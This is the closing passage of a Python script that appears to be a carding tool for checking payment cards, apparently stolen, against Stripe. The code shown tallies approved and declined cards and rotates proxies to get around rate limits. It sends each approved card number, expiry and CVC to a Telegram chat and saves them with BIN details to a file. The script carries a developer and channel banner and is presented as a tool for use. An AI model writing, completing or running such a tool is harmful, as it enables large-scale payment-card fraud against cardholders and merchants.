║ {Fore.YELLOW}⚠️  ERRORS:         {stats['errors']:<5}                                 ║
║ {Fore.YELLOW}🚦 RATE LIMITED:   {stats['rate_limited']:<5}                             ║
╠═══════════════════════════════════════════════════════════════════╣
║ {Fore.WHITE}📊 TOTAL:          {total_cards:<5} cards processed                      ║
║ {Fore.WHITE}⏱️  TIME:           {elapsed_time:.1f} seconds                          ║
║ {Fore.WHITE}⚡ SPEED:          {total_cards/elapsed_time:.2f} cards/second          ║
║ {Fore.WHITE}🌐 PROXIES:        {len(working_proxies) if USE_PROXY else 0} active proxies{' ' * (40 - len(str(len(working_proxies) if USE_PROXY else 0)))}║
╠═══════════════════════════════════════════════════════════════════╣
║ {Fore.WHITE}👤 Developer: {DEVELOPER}                                              ║
║ {Fore.WHITE}📢 Channel:   {CHANNEL}                                              ║
╚═══════════════════════════════════════════════════════════════════╝{Fore.RESET}
    """)
    
    # Send results to Telegram if configured
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID and approved_cards:
        print(f"\n{Fore.YELLOW} 📤 Sending approved cards to Telegram...{Fore.RESET}")
        for card in approved_cards:
            n, mm, yy, cvc = card
            msg_text = (
                f"✅ <b>APPROVED CARD</b>\n"
                f"<code>{n}|{mm}|{yy}|{cvc}</code>\n"
                f"💳 <b>Bin:</b> {n[:6]}\n"
                f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"👤 <b>Developer:</b> {DEVELOPER}\n"
                f"📢 <b>Channel:</b> {CHANNEL}"
            )
            send_telegram_message(msg_text)
            time.sleep(0.3)
        
        # Send final summary
        summary = (
            f"🏁 <b>Check Completed</b>\n\n"
            f"✅ <b>Approved:</b> {stats['approved']}\n"
            f"❌ <b>Declined:</b> {stats['declined']}\n"
            f"⚠️ <b>Errors:</b> {stats['errors']}\n"
            f"🚦 <b>Rate Limited:</b> {stats['rate_limited']}\n"
            f"🔢 <b>Total checked:</b> {total_cards}\n"
            f"⏱️ <b>Time taken:</b> {elapsed_time:.1f} seconds\n"
            f"🌐 <b>Proxies used:</b> {len(working_proxies) if USE_PROXY else 0}\n"
            f"💻 <b>Developer:</b> {DEVELOPER}\n"
            f"📢 <b>Channel:</b> {CHANNEL}"
        )
        send_telegram_message(summary)
    
    # Save results
    if approved_cards:
        filename = f"approved_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(f"# Stripe Approved Cards - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Developer: {DEVELOPER}\n")
            f.write(f"# Channel: {CHANNEL}\n")
            f.write(f"# Total Checked: {total_cards}\n")
            f.write(f"# Approved: {len(approved_cards)}\n")
            f.write(f"# Proxies Used: {len(working_proxies) if USE_PROXY else 0}\n")
            f.write("#" + "="*50 + "\n\n")
            for card in approved_cards:
                n, mm, yy, cvc = card
                bin_info = get_card_bin_info(n)
                f.write(f"{n}|{mm}|{yy}|{cvc}  # {bin_info['type']} - BIN: {bin_info['bin']}\n")
        
        print(f"{Fore.GREEN}💾 Approved cards saved to: {Fore.YELLOW}{filename}{Fore.RESET}")
        print(f"{Fore.GREEN}📊 Total approved: {Fore.YELLOW}{len(approved_cards)}{Fore.RESET}")
    
    # Save proxy stats if proxies were used
    if USE_PROXY and failed_proxies:
        proxy_log = f"proxy_stats_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(proxy_log, 'w') as f:
            f.write(f"# Proxy Statistics - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Working Proxies: {len(working_proxies)}\n")
            f.write(f"# Failed Proxies: {len(failed_proxies)}\n\n")
            f.write("Failed Proxies:\n")
            for proxy in failed_proxies:
                f.write(f"{proxy}\n")
        print(f"{Fore.YELLOW}📊 Proxy stats saved to: {proxy_log}{Fore.RESET}")
    
    input(f"\n{Fore.CYAN} Press Enter to exit...{Fore.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⚠️  Process interrupted by user{Fore.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n{Fore.RED}❌ Fatal error: {e}{Fore.RESET}")
        import traceback
        traceback.print_exc()
        input(f"\n{Fore.YELLOW} Press Enter to exit...{Fore.RESET}")
